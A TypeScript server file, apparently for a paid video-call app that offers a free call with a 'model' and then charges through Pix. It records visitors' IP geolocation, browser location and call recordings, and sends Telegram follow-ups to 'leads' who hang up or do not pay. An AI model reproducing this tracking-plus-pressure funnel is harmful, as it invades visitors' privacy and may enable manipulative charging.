import { createServerFn } from "@tanstack/react-start";
import { getRequestHeader } from "@tanstack/react-start/server";
import { z } from "zod";

// Public data only: returns signed media URLs for the private media bucket.
export const getCallSettings = createServerFn({ method: "GET" }).handler(async () => {
  const { createBackendClient } = await import("@/lib/backend-public.server");
  const supabase = createBackendClient();
  const { data, error } = await supabase
    .from("settings")
    .select(
      "model_name, model_photo_url, video_url, free_duration_seconds, price_cents, offer_title, offer_subtitle, contact_url, telegram_bot_username",
    )
    .eq("id", 1)
    .single();

  if (error) throw new Error(error.message);

  const signMedia = async (value: string | null) => {
    if (!value) return null;
    let path = value;
    if (value.startsWith("http")) {
      const marker = "/media/";
      const index = value.indexOf(marker);
      if (index === -1) return value;
      path = decodeURIComponent(value.slice(index + marker.length).split("?")[0] ?? "");
    }
    const { data: signed, error: signError } = await supabase.storage
      .from("media")
      .createSignedUrl(path, 60 * 60 * 6);
    if (signError) return value;
    return signed.signedUrl;
  };

  return {
    ...data,
    model_photo_url: await signMedia(data.model_photo_url),
    video_url: await signMedia(data.video_url),
  };
});

// ---------- Start call session ----------
export const startCallSession = createServerFn({ method: "POST" })
  .inputValidator(
    (data: {
      consent: boolean;
      telegramChatId?: number | null;
      telegramUsername?: string | null;
    }) =>
      z
        .object({
          consent: z.boolean(),
          telegramChatId: z.number().int().nullish(),
          telegramUsername: z.string().max(64).nullish(),
        })
        .parse(data),
  )
  .handler(async ({ data }) => {
    const { createBackendClient } = await import("@/lib/backend-public.server");
    const supabase = createBackendClient();
    const userAgent = getRequestHeader("user-agent") ?? null;
    const cf = getRequestHeader("cf-connecting-ip");
    const fwd = getRequestHeader("x-forwarded-for");
    const real = getRequestHeader("x-real-ip");
    const ip = cf || fwd?.split(",")[0]?.trim() || real || null;
    let savedPhone: string | null = null;
    let geo: {
      city: string | null;
      region: string | null;
      country: string | null;
      lat: number | null;
      lng: number | null;
    } | null = null;

    if (ip && ip !== "127.0.0.1" && ip !== "::1") {
      try {
        const res = await fetch(`https://ipapi.co/${encodeURIComponent(ip)}/json/`, {
          headers: { "User-Agent": "call-app/1.0" },
        });
        if (res.ok) {
          const j = (await res.json()) as {
            city?: string;
            region?: string;
            country_name?: string;
            latitude?: number;
            longitude?: number;
          };
          geo = {
            city: j.city ?? null,
            region: j.region ?? null,
            country: j.country_name ?? null,
            lat: j.latitude ?? null,
            lng: j.longitude ?? null,
          };
        }
      } catch {
        geo = null;
      }
    }

    if (data.telegramChatId) {
      savedPhone = null;
    }

    const { data: row, error } = await (supabase as any).rpc("app_start_call_session", {
      _consent: data.consent,
      _telegram_chat_id: data.telegramChatId ?? null,
      _telegram_username: data.telegramUsername ?? null,
      _user_agent: userAgent,
      _ip: ip,
      _geo_city: geo?.city ?? null,
      _geo_region: geo?.region ?? null,
      _geo_country: geo?.country ?? null,
      _geo_lat: geo?.lat ?? null,
      _geo_lng: geo?.lng ?? null,
    });

    if (error) throw new Error(error.message);
    return { sessionId: row as string };
  });

// ---------- Save browser-provided geolocation ----------
export const saveGeolocation = createServerFn({ method: "POST" })
  .inputValidator(
    (data: { sessionId: string; lat: number; lng: number; accuracy: number }) =>
      z
        .object({
          sessionId: z.string().uuid(),
          lat: z.number(),
          lng: z.number(),
          accuracy: z.number(),
        })
        .parse(data),
  )
  .handler(async ({ data }) => {
    const { createBackendClient } = await import("@/lib/backend-public.server");
    const supabase = createBackendClient();
    const { error } = await (supabase as any).rpc("app_update_session_geo", {
      _session_id: data.sessionId,
      _lat: data.lat,
      _lng: data.lng,
      _accuracy: data.accuracy,
    });
    if (error) throw new Error(error.message);
    return { ok: true };
  });

// ---------- Get signed upload URL for recording ----------
export const getRecordingUploadUrl = createServerFn({ method: "POST" })
  .inputValidator((data: { sessionId: string; ext: string }) =>
    z
      .object({
        sessionId: z.string().uuid(),
        ext: z.string().max(10),
      })
      .parse(data),
  )
  .handler(async ({ data }) => {
    const { createBackendClient } = await import("@/lib/backend-public.server");
    const supabase = createBackendClient();
    const cleanExt = data.ext.replace(/[^a-z0-9]/gi, "") || "webm";
    const path = `recordings/${data.sessionId}-${Date.now()}.${cleanExt}`;
    const { data: signed, error } = await supabase.storage
      .from("media")
      .createSignedUploadUrl(path);
    if (error) throw new Error(error.message);
    return { path, token: signed.token };
  });

export const confirmRecordingUploaded = createServerFn({ method: "POST" })
  .inputValidator((data: { sessionId: string; path: string }) =>
    z.object({ sessionId: z.string().uuid(), path: z.string().min(1) }).parse(data),
  )
  .handler(async ({ data }) => {
    const { createBackendClient } = await import("@/lib/backend-public.server");
    const supabase = createBackendClient();
    const { error } = await (supabase as any).rpc("app_set_recording_path", {
      _session_id: data.sessionId,
      _path: data.path,
    });
    if (error) throw new Error(error.message);
    return { ok: true };
  });


// ---------- Mark free call ended ----------
export const endFreeCall = createServerFn({ method: "POST" })
  .inputValidator((data: { sessionId: string }) =>
    z.object({ sessionId: z.string().uuid() }).parse(data),
  )
  .handler(async ({ data }) => {
    const { createBackendClient } = await import("@/lib/backend-public.server");
    const supabase = createBackendClient();
    const { error } = await (supabase as any).rpc("app_end_free_call", {
      _session_id: data.sessionId,
    });
    if (error) throw new Error(error.message);
    return { ok: true };
  });

// ---------- Mark call completed ----------
export const completeCall = createServerFn({ method: "POST" })
  .inputValidator((data: { sessionId: string }) =>
    z.object({ sessionId: z.string().uuid() }).parse(data),
  )
  .handler(async ({ data }) => {
    const { createBackendClient } = await import("@/lib/backend-public.server");
    const supabase = createBackendClient();
    const { error } = await (supabase as any).rpc("app_complete_call", {
      _session_id: data.sessionId,
    });
    if (error) throw new Error(error.message);
    return { ok: true };
  });

// ---------- Create Pix Payment (call) ----------
export const createPixPayment = createServerFn({ method: "POST" })
  .inputValidator((data: { sessionId: string }) =>
    z.object({ sessionId: z.string().uuid() }).parse(data),
  )
  .handler(async ({ data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

    const { data: settings, error: sErr } = await supabaseAdmin
      .from("settings")
      .select("price_cents")
      .eq("id", 1)
      .single();
    if (sErr) throw new Error(sErr.message);
    const amountCents = settings.price_cents ?? 3000;
    const { data: session } = await supabaseAdmin
      .from("call_sessions")
      .select("phone")
      .eq("id", data.sessionId)
      .maybeSingle();

    if (!process.env.PARADISE_API_KEY) {
      const { data: payment, error: pErr } = await supabaseAdmin
        .from("payments")
        .insert({
          session_id: data.sessionId,
          kind: "call",
          amount_cents: amountCents,
          status: "not_configured",
        })
        .select("id")
        .single();
      if (pErr) throw new Error(pErr.message);
      return { configured: false as const, paymentId: payment.id as string, amountCents };
    }

    const reference = `call-${data.sessionId}-${Date.now()}`;
    const { paradiseCreatePix } = await import("@/lib/paradise.server");
    const pix = await paradiseCreatePix({
      amountCents,
      description: "Continuar chamada de vídeo",
      reference,
      phone: session?.phone ?? null,
    });

    const { data: payment, error: pErr } = await supabaseAdmin
      .from("payments")
      .insert({
        session_id: data.sessionId,
        kind: "call",
        provider: "paradise",
        provider_payment_id: pix.transactionId,
        amount_cents: amountCents,
        status: pix.status,
        qr_code: pix.qrCode || null,
        qr_code_base64: pix.qrCodeBase64 || null,
      })
      .select("id")
      .single();
    if (pErr) throw new Error(pErr.message);

    return {
      configured: true as const,
      paymentId: payment.id as string,
      amountCents,
      qrCode: pix.qrCode,
      qrCodeBase64: pix.qrCodeBase64,
      ticketUrl: "",
    };
  });

// ---------- Check payment status ----------
export const checkPayment = createServerFn({ method: "POST" })
  .inputValidator((data: { paymentId: string }) =>
    z.object({ paymentId: z.string().uuid() }).parse(data),
  )
  .handler(async ({ data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { data: payment, error } = await supabaseAdmin
      .from("payments")
      .select("id, provider_payment_id, status, session_id")
      .eq("id", data.paymentId)
      .single();
    if (error) throw new Error(error.message);
    if (payment.status === "approved") return { status: "approved" as const };
    if (!payment.provider_payment_id) return { status: payment.status };

    const { paradiseGetStatus } = await import("@/lib/paradise.server");
    const newStatus = await paradiseGetStatus(payment.provider_payment_id);
    if (newStatus && newStatus !== payment.status) {
      await supabaseAdmin.from("payments").update({ status: newStatus }).eq("id", payment.id);
      if (newStatus === "approved" && payment.session_id) {
        await supabaseAdmin
          .from("call_sessions")
          .update({ status: "paid", paid_at: new Date().toISOString(), has_paid: true })
          .eq("id", payment.session_id);
      }
      return { status: newStatus };
    }
    return { status: payment.status };
  });

// ---------- Send "hangup" dispatch immediately (lead hung up before free ended) ----------
export const scheduleHangupDispatch = createServerFn({ method: "POST" })
  .inputValidator((data: { sessionId: string }) =>
    z.object({ sessionId: z.string().uuid() }).parse(data),
  )
  .handler(async ({ data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    // Only send if the lead came from Telegram (has chat_id) and no dispatch was sent
    const { data: row } = await supabaseAdmin
      .from("call_sessions")
      .select("telegram_chat_id, dispatch_hangup_sent_at, has_paid")
      .eq("id", data.sessionId)
      .maybeSingle();
    if (!row?.telegram_chat_id || row.dispatch_hangup_sent_at || row.has_paid) {
      return { ok: true, sent: false };
    }
    const { dispatchToLead } = await import("@/lib/telegram.server");
    const res = await dispatchToLead(data.sessionId, "hangup");
    return { ok: res.ok, sent: res.ok, reason: res.reason };
  });

// ---------- Payment button shown → send "no_payment" dispatch immediately ----------
export const schedulePaymentDispatch = createServerFn({ method: "POST" })
  .inputValidator((data: { sessionId: string }) =>
    z.object({ sessionId: z.string().uuid() }).parse(data),
  )
  .handler(async ({ data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { data: row } = await supabaseAdmin
      .from("call_sessions")
      .select("telegram_chat_id, dispatch_no_payment_sent_at, has_paid")
      .eq("id", data.sessionId)
      .maybeSingle();
    if (!row?.telegram_chat_id || row.dispatch_no_payment_sent_at || row.has_paid) {
      return { ok: true, sent: false };
    }
    const { error } = await supabaseAdmin
      .from("call_sessions")
      .update({
        payment_button_shown_at: new Date().toISOString(),
      })
      .eq("id", data.sessionId);
    if (error) throw new Error(error.message);
    const { dispatchToLead } = await import("@/lib/telegram.server");
    const res = await dispatchToLead(data.sessionId, "no_payment");
    return { ok: res.ok, sent: res.ok, reason: res.reason };
  });

// ---------- Cancel any pending dispatch (e.g. after they pay) ----------
export const cancelScheduledDispatch = createServerFn({ method: "POST" })
  .inputValidator((data: { sessionId: string }) =>
    z.object({ sessionId: z.string().uuid() }).parse(data),
  )
  .handler(async ({ data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    await supabaseAdmin
      .from("call_sessions")
      .update({ dispatch_scheduled_at: null, dispatch_reason: null })
      .eq("id", data.sessionId);
    return { ok: true };
  });

// ---------- Send "post_payment" dispatch immediately (after paid call finished) ----------
export const dispatchPostPayment = createServerFn({ method: "POST" })
  .inputValidator((data: { sessionId: string }) =>
    z.object({ sessionId: z.string().uuid() }).parse(data),
  )
  .handler(async ({ data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { data: row } = await supabaseAdmin
      .from("call_sessions")
      .select("telegram_chat_id, dispatch_post_payment_sent_at")
      .eq("id", data.sessionId)
      .maybeSingle();
    if (!row?.telegram_chat_id || row.dispatch_post_payment_sent_at) {
      return { ok: true, sent: false };
    }
    const { dispatchToLead } = await import("@/lib/telegram.server");
    const res = await dispatchToLead(data.sessionId, "post_payment");
    return { ok: res.ok, sent: res.ok, reason: res.reason };
  });

// ---------- Create Pix for the dispatch (used inside the /pay/:sessionId page) ----------
export const createDispatchPixPayment = createServerFn({ method: "POST" })
  .inputValidator((data: { sessionId: string }) =>
    z.object({ sessionId: z.string().uuid() }).parse(data),
  )
  .handler(async ({ data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");

    // Reuse an existing pending dispatch payment for this session to avoid QR spam
    const { data: existing } = await supabaseAdmin
      .from("payments")
      .select("id, status, amount_cents, qr_code, qr_code_base64, ticket_url")
      .eq("session_id", data.sessionId)
      .eq("kind", "dispatch")
      .in("status", ["pending", "processing", "in_process", "under_review", "approved"])
      .order("created_at", { ascending: false })
      .limit(1)
      .maybeSingle();
    if (existing) {
      return {
        configured: true as const,
        paymentId: existing.id as string,
        amountCents: existing.amount_cents,
        status: existing.status,
        qrCode: existing.qr_code ?? "",
        qrCodeBase64: existing.qr_code_base64 ?? "",
        ticketUrl: existing.ticket_url ?? "",
      };
    }

    const { data: settings, error: sErr } = await supabaseAdmin
      .from("settings")
      .select("dispatch_price_cents")
      .eq("id", 1)
      .single();
    if (sErr) throw new Error(sErr.message);
    const amountCents = settings.dispatch_price_cents ?? 1990;
    const { data: session } = await supabaseAdmin
      .from("call_sessions")
      .select("phone")
      .eq("id", data.sessionId)
      .maybeSingle();

    if (!process.env.PARADISE_API_KEY) {
      const { data: payment, error: pErr } = await supabaseAdmin
        .from("payments")
        .insert({
          session_id: data.sessionId,
          kind: "dispatch",
          amount_cents: amountCents,
          status: "not_configured",
        })
        .select("id")
        .single();
      if (pErr) throw new Error(pErr.message);
      return {
        configured: false as const,
        paymentId: payment.id as string,
        amountCents,
        status: "not_configured",
      };
    }

    const reference = `disp-${data.sessionId}-${Date.now()}`;
    const { paradiseCreatePix } = await import("@/lib/paradise.server");
    const pix = await paradiseCreatePix({
      amountCents,
      description: "Receber os dados no Telegram",
      reference,
      phone: session?.phone ?? null,
    });

    const { data: payment, error: pErr } = await supabaseAdmin
      .from("payments")
      .insert({
        session_id: data.sessionId,
        kind: "dispatch",
        provider: "paradise",
        provider_payment_id: pix.transactionId,
        amount_cents: amountCents,
        status: pix.status,
        qr_code: pix.qrCode || null,
        qr_code_base64: pix.qrCodeBase64 || null,
      })
      .select("id")
      .single();
    if (pErr) throw new Error(pErr.message);

    return {
      configured: true as const,
      paymentId: payment.id as string,
      amountCents,
      status: pix.status,
      qrCode: pix.qrCode,
      qrCodeBase64: pix.qrCodeBase64,
      ticketUrl: "",
    };
  });

// Check dispatch payment status (polled by /pay/:sessionId)
export const checkDispatchPayment = createServerFn({ method: "POST" })
  .inputValidator((data: { paymentId: string }) =>
    z.object({ paymentId: z.string().uuid() }).parse(data),
  )
  .handler(async ({ data }) => {
    const { supabaseAdmin } = await import("@/integrations/supabase/client.server");
    const { data: payment, error } = await supabaseAdmin
      .from("payments")
      .select("id, provider_payment_id, status, session_id, kind")
      .eq("id", data.paymentId)
      .single();
    if (error) throw new Error(error.message);
    if (payment.status === "approved") return { status: "approved" as const };
    if (!payment.provider_payment_id) return { status: payment.status };

    const { paradiseGetStatus } = await import("@/lib/paradise.server");
    const newStatus = await paradiseGetStatus(payment.provider_payment_id);
    if (newStatus && newStatus !== payment.status) {
      await supabaseAdmin.from("payments").update({ status: newStatus }).eq("id", payment.id);
      if (newStatus === "approved" && payment.session_id) {
        await supabaseAdmin
          .from("call_sessions")
          .update({ dispatch_paid_at: new Date().toISOString() })
          .eq("id", payment.session_id);
      }
      return { status: newStatus };
    }
    return { status: payment.status };
  });
